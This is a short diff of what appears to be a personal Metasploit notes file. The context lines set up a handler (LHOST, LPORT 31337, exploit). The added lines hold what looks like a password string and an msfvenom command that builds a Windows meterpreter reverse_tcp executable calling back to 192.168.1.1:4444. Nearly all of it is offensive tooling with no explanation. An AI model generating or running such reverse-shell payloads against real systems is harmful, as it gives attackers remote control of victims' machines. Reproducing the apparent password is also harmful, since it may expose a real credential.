@@ -11,3 +11,7 @@ show options
 set LHOST 172.16.104.130
 set LPORT 31337
 exploit
+
+N3v3r@D13
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe -o /root/Desktop/lol.exe
